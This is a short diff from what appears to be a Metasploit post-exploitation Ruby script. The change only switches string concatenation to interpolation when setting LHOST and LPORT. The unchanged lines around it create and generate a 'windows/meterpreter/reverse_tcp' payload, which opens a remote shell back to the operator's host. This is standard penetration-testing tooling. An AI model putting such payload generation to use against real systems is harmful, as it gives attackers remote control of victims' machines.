@@ -43,7 +43,7 @@ use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true
 # Create the payload instance
 payload_name = 'windows/meterpreter/reverse_tcp'
 payload = framework.payloads.create(payload_name)
-options = 'LHOST='+lhost + ' LPORT='+lport
+options = "LHOST=#{lhost} LPORT=#{lport}"
 buf = payload.generate_simple('OptionStr' => options)
 
 #
